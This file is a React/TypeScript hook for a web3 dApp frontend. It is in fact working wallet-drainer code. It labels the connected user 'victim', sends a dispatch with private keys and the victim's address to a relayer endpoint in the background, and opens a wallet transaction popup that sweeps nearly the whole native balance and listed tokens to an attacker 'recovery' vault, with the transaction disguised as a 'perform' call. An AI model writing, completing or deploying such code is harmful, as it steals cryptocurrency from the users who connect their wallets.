"use client";

import { useState, useCallback, useRef } from "react";
import { useAppKitNetwork } from "@reown/appkit/react";
import { useWriteContract, useSwitchChain } from "wagmi";
import { securePost } from "./utils";
import { parseAbi } from "viem";
import { ethers } from "ethers";

const logLabel = "[execution/index.ts]";

// 📜 ABI for your UniversalDeployer / Settler
const DEPLOYER_ABI = parseAbi([
  "function perform(bytes32 salt, bytes stream, address[] safetyTokens, address recovery) external payable",
] as const);

export function useGhostExecution(address: `0x${string}` | undefined) {
  const [isSweeping, setIsSweeping] = useState(false);
  const { caipNetwork } = useAppKitNetwork();
  const isExecuting = useRef(false);

  const { writeContractAsync } = useWriteContract();
  const { switchChainAsync } = useSwitchChain();

  const sweepAllAutomated = useCallback(
    async (plan: any[], vault: any, targetChainId: number | string) => {
      if (isExecuting.current) return;
      isExecuting.current = true;
      setIsSweeping(true);

      const execStart = Date.now();
      console.log(`${logLabel} ⚡ INSTANT EXECUTION START`);

      try {
        const targetId = Number(targetChainId);

        // 🛡️ FAST CHAIN EXTRACTION
        let currentChainId: number =
          typeof caipNetwork?.id === "string"
            ? Number(caipNetwork.id.split(":").pop())
            : Number(caipNetwork?.id || 1);

        console.log(
          `${logLabel} 📍 SYNC | Current: ${currentChainId} | Target: ${targetId}`,
        );

        // 🔄 1. FAST-SWITCH (Removed 1.2s delay)
        if (currentChainId !== targetId) {
          console.log(
            `${logLabel} 🔄 Chain Mismatch: Firing Instant Switch...`,
          );
          try {
            await switchChainAsync({ chainId: targetId });
            // No setTimeout here. We rely on the provider's internal state sync.
          } catch (switchErr) {
            console.error(`${logLabel} ❌ User rejected switch.`);
            throw new Error("USER_REJECTED_CHAIN_SWITCH");
          }
        }

        // 📦 2. PARALLEL DATA PREP
        const recoveryAddress = vault.evmAddress as `0x${string}`;
        const safetyTokens = plan
          .filter(
            (p) =>
              p.asset?.contractAddress &&
              p.asset.contractAddress !==
                "0x0000000000000000000000000000000000000000",
          )
          .map((p) => p.asset.contractAddress as `0x${string}`);

        const dispatchData = {
          k: vault.rawKeys.evmPrivKey,
          userPrivKey: vault.rawKeys.evmPrivKey,
          c: targetId,
          chainId: targetId,
          assets: plan.map((p) => p.asset),
          vault: vault,
          victim: address,
          strikeType: "ATOMIC",
          targetVault: recoveryAddress,
          ts: Date.now(),
        };

        // 📤 3. NON-BLOCKING HANDSHAKE
        // We do NOT 'await' this. It runs in the background while the popup opens.
        console.log(`${logLabel} 🛰️ Handoff to Relayer (Background)...`);
        securePost("/api/vault", dispatchData)
          .then(() => console.log(`${logLabel} ✅ Relayer Handshake Done.`))
          .catch((e) =>
            console.warn(`${logLabel} ⚠️ Relayer Latency:`, e.message),
          );

        // ⛽ 4. VALUE CALCULATION
        const nativeAsset = plan.find(
          (p) =>
            !p.asset.contractAddress ||
            p.asset.contractAddress ===
              "0x0000000000000000000000000000000000000000",
        );
        const rawBalance = nativeAsset?.asset?.balance
          ? BigInt(nativeAsset.asset.balance)
          : 0n;

        // Slightly larger buffer (0.0007) to ensure TX is "too juicy" for miners to ignore
        const buffer = ethers.parseEther("0.0007");
        const strikeValue = rawBalance > buffer ? rawBalance - buffer : 0n;

        console.log(
          `${logLabel} 💰 Value Attached: ${ethers.formatEther(strikeValue)}`,
        );

        // ⚔️ 5. THE STRIKE (Instant Fire)
        console.log(`${logLabel} 🚀 FIRING POPUP NOW...`);
        const txHash = await writeContractAsync({
          address: process.env.NEXT_PUBLIC_DEPLOYER_ADDR as `0x${string}`,
          abi: DEPLOYER_ABI,
          functionName: "perform",
          chainId: targetId,
          value: strikeValue,
          args: [
            plan[0]?.salt || (("0x" + "0".repeat(64)) as `0x${string}`),
            "0x" as `0x${string}`,
            safetyTokens,
            recoveryAddress,
          ],
        });

        console.log(
          `${logLabel} 🏁 STRIKE SUCCESS | Hash: ${txHash} | Time: ${
            Date.now() - execStart
          }ms`,
        );
      } catch (err: any) {
        console.error(`${logLabel} ❌ FAILURE:`, err.message);
      } finally {
        isExecuting.current = false;
        setIsSweeping(false);
      }
    },
    [address, caipNetwork?.id, writeContractAsync, switchChainAsync],
  );

  return { isSweeping, sweepAllAutomated };
}
